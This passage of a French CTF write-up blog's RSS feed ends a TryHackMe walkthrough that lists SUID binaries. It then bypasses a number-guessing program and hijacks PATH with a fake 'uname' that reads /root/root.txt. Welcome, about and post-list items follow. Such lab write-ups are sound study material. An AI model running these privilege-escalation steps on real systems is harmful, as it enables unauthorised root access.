&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;149080&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sudo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;22520&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;pkexec
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;44528&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;chsh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;76496&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;chfn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;37136&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newuidmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;18448&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;traceroute6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iputils
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;37136&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newgidmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;59640&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;passwd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;75824&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;gpasswd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;40344&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newgrp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;100760&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x86_64&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;gnu&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lxc&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lxc&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nic
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;14328&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;policykit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;polkit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;agent&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;helper&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root messagebus &lt;span style=&#34;color:#ae81ff&#34;&gt;42992&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dbus&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dbus&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;daemon&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;launch&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;helper
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;10232&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;eject&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dmcrypt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;get&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;113528&lt;/span&gt; Oct  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snapd&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;confine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;436552&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;openssh&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ssh&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;keysign
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;26696&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;umount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;30800&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;fusermount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;44664&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;su
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;64424&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ping
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;43088&lt;/span&gt; Sep &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mount
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le seul fichier qui sort du lot est le &lt;strong&gt;/srv/time-turner/swagger&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Il s‚Äôagit d‚Äôun programme type ‚Äúguess my number‚Äù, tr√®s classique mais surtout tr√®s facile √† bypass&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131690-3db21737-74f7-42f4-8533-63d046fff34b.png&#34; alt=&#34;2022-12-12-194803_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Pour avoir le bon nombre, j‚Äôutilise ce petit payload:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è echo 1 | ./swagger | tr -dc ‚Äò0-9‚Äô | ./swagger&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131709-0111da88-5d39-463f-9f2e-6c6af3f0646e.png&#34; alt=&#34;2022-12-12-194924_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Le tr -dc permet de ne r√©cup√©rer que les chiffres, or, puisqu‚Äôil nous donne le chiffre ‚Äúqu‚Äôil avait choisi‚Äù, on peut directement lui redonner et le chiffre n‚Äôaura pas chang√© puisque les 4 commandes sont faites en parall√®le&lt;/p&gt;
&lt;p&gt;Je vois qu‚Äôil me donne l‚Äôarchitecture syst√®me‚Ä¶pas utile&lt;/p&gt;
&lt;p&gt;Par contre on peut supposer qu‚Äôil fait appel √† la commande &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;uname&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Je part donc sur une path hijacking, je cr√©e un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;uname&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/tmp/&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, puis je lui donne tout les permissions et je met √† jour le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;PATH&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è echo &amp;quot;cat /root/root.txt&amp;quot; &amp;gt; /tmp/uname&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è chmod +x /tmp/uname&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è export PATH=/tmp:$PATH&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Maintenant, plus qu‚Äô√† r√©utiliser le payload pour qu‚Äôil fasse appel au &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;uname&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, et normalement le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;root.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; devrait √™tre lu&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131741-2b37d8b6-cbca-4cf4-982d-2da93ebdb9e1.png&#34; alt=&#34;2022-12-12-195317_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;gg!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Bienvenue !</title>
      <link>/posts/hello/</link>
      <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/hello/</guid>
      <description>Bienvenue sur mon blog. Vous trouverez ici des writeups pour les challenges/CTFs que je fait, et des peut √™tre des posts un peu diff√©rents o√π j&amp;rsquo;explique certains exploits. J&amp;rsquo;ajouterai aussi prochainement une &amp;ldquo;vitrine&amp;rdquo; avec quelques tools utiles que j&amp;rsquo;ai fait (en python ou en bash pour la grande majorit√©).
Bonne lecture !</description>
      <content>&lt;p&gt;Bienvenue sur mon blog. Vous trouverez ici des writeups pour les challenges/CTFs que je fait, et des peut √™tre des posts un peu diff√©rents o√π j&amp;rsquo;explique certains exploits. J&amp;rsquo;ajouterai aussi prochainement une &amp;ldquo;vitrine&amp;rdquo; avec quelques tools utiles que j&amp;rsquo;ai fait (en python ou en bash pour la grande majorit√©).&lt;/p&gt;
&lt;p&gt;Bonne lecture !&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/about/</guid>
      <description>Bonjour üëã Je m&amp;rsquo;appelle ‚ñÆ‚ñÆ‚ñÆ‚ñÆ‚ñÆ, je suis passion√© d&amp;rsquo;informatique et plus pr√©cis√©ment de cybers√©curit√©. Je m&amp;rsquo;int√©resse aussi √† la programmation, et au web3
Je sais pas trop quoi dire sur moi donc abonnez vous plutot √† mon twitter: @plugglover
Vous pouvez aussi regarder mon github mais je doute qu&amp;rsquo;il y ait quoi que ce soit de disponible en publique, et sinon vous pouvez venir me parler sur discord</description>
      <content>&lt;h1 id=&#34;bonjour-&#34;&gt;Bonjour üëã&lt;/h1&gt;
&lt;p&gt;Je m&amp;rsquo;appelle ‚ñÆ‚ñÆ‚ñÆ‚ñÆ‚ñÆ, je suis passion√© d&amp;rsquo;informatique et plus pr√©cis√©ment de cybers√©curit√©. Je m&amp;rsquo;int√©resse aussi √† la programmation, et au web3&lt;/p&gt;
&lt;p&gt;Je sais pas trop quoi dire sur moi donc abonnez vous plutot √† mon twitter: &lt;a href=&#34;https://twitter.com/@plugglover&#34;&gt;@plugglover&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Vous pouvez aussi regarder &lt;a href=&#34;https://github.com/c0nfl1c7&#34;&gt;mon github&lt;/a&gt; mais je doute qu&amp;rsquo;il y ait quoi que ce soit de disponible en publique, et sinon vous pouvez venir me parler &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;sur discord&lt;/a&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Posts List</title>
      <link>/posts-list/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/posts-list/</guid>
      <description>Liste des diff√©rents writeups que vous pourrez retrouver ici
Try Hack Me mr-robot-ctf.thm (medium) wonderland.thm (medium) dogcat.thm (medium) anonymous.thm (medium) ultratech.thm (medium) madeyes-castle.thm (medium) Hack The Box none
Other NahamCon CTF 2022 Writeups </description>
      <content>&lt;p&gt;Liste des diff√©rents writeups que vous pourrez retrouver ici&lt;/p&gt;
&lt;h1 id=&#34;try-hack-me&#34;&gt;Try Hack Me&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-mrrobot&#34;&gt;mr-robot-ctf.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-wonderland&#34;&gt;wonderland.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-dogcat&#34;&gt;dogcat.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-anonymous&#34;&gt;anonymous.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-ultratech&#34;&gt;ultratech.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/thm-madeyes&#34;&gt;madeyes-castle.thm&lt;/a&gt; (medium)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;hack-the-box&#34;&gt;Hack The Box&lt;/h1&gt;
&lt;p&gt;none&lt;/p&gt;
&lt;h1 id=&#34;other&#34;&gt;Other&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;/posts/nahamcon2022&#34;&gt;NahamCon CTF 2022 Writeups&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
